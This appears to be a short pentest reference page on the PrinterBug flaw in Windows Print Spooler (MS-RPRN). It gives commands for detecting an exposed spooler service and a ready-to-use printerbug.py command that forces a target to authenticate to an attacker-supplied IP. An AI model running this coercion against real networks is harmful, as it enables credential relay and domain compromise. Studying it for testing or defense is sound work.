# MS-RPRN abuse (PrinterBug)

Microsoft’s Print Spooler is a service handling the print jobs and other various tasks related to printing. An attacker controling a domain user/computer can, with a specific RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing. This flaw is a "won't fix" and enabled by default on all Windows environments

### Detect

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Check if the spooler service is available on the target machine
rpcdump.py <TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Check if the spooler service is available on the target machine
http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment
Import-Module .\SecurityAssessment.ps1

https://github.com/NotMedic/NetNTLMtoSilverTicket
Get-SpoolStatus -ComputerName <COMPUTER_NAME> 
```
{% endtab %}
{% endtabs %}

### Exploit

```shellscript
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
printerbug.py '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<TARGET>' '<ATTACKER_IP>'
```
